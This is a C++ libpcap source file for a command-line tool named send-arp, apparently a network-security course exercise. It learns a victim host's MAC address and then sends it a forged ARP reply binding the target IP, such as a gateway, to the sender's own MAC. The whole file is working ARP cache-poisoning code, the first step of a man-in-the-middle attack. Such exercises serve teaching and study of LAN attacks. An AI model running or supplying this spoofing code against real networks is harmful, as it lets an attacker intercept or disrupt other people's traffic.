#include "send-arp.h"

void usage()
{
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void Get_MAC(char *dev, uint8_t *mac){
    struct ifreq ifr;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(ifr.ifr_name,dev);
    if(0 == ioctl(fd, SIOCGIFHWADDR, &ifr)){
        for(int i=0; i<6; i++)
            mac[i] = ifr.ifr_hwaddr.sa_data[i];
    }else{
        printf("MAC Error!!! \n");
        exit (1);
    }
}

int main(int argc, char* argv[])
{
    if (argc != 4)
    {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char* sender_IP = argv[2];
    char* target_IP = argv[3];
    uint8_t me_mac[6];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    char* me_IP;
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(0 < (ioctl(fd, SIOCGIFADDR, &ifr)))
    {
        printf("IP Error !!!\n");
        exit (1);
    }
    me_IP = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

    EthArpPacket req_packet;
    Get_MAC(dev, me_mac);
    for(int i=0; i<6; i++)
    {
        req_packet.eth_.dmac_[i] = 0xff;
    }
    for(int i=0; i<6; i++)
    {
        req_packet.eth_.smac_[i] = me_mac[i];
    }
    for(int i=0; i<6; i++)
    {
        req_packet.arp_.tmac_[i] = 0x00;
    }
    for(int i=0; i<6; i++)
    {
        req_packet.arp_.smac_[i] = me_mac[i];
    }
    req_packet.eth_.type_ = htons(EthHdr::Arp);
    req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    req_packet.arp_.pro_ = htons(EthHdr::Ip4);
    req_packet.arp_.hln_ = Mac::SIZE;
    req_packet.arp_.pln_ = Ip::SIZE;
    req_packet.arp_.op_ = htons(ArpHdr::Request);
    req_packet.arp_.sip_ = htonl(Ip(me_IP));
    req_packet.arp_.tip_= htonl(Ip(sender_IP));

    int request = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&req_packet),sizeof(EthArpPacket));
    if (request != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", request, pcap_geterr(handle));
    }
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        typedef struct EthArpPacket Eth_Arp;
        Eth_Arp *rep = (Eth_Arp *)(packet);

        if(ntohs((*rep).eth_.type_) != EthHdr::Arp) continue;
        if((*rep).arp_.tip_ == req_packet.arp_.sip_&&(*rep).arp_.sip_ == req_packet.arp_.tip_)
        {
            req_packet.eth_.dmac_ = (*rep).arp_.smac_;
            req_packet.arp_.tmac_ = (*rep).arp_.smac_;
            req_packet.arp_.op_ = htons(ArpHdr::Reply);
            req_packet.arp_.sip_ = htonl(Ip(target_IP));
            int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
            if (reply != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", reply, pcap_geterr(handle));
            }
            break;
        }
        else{
            printf("Reply Error!!!\n");
            return 0;
        }
        pcap_close(handle);
    }
}
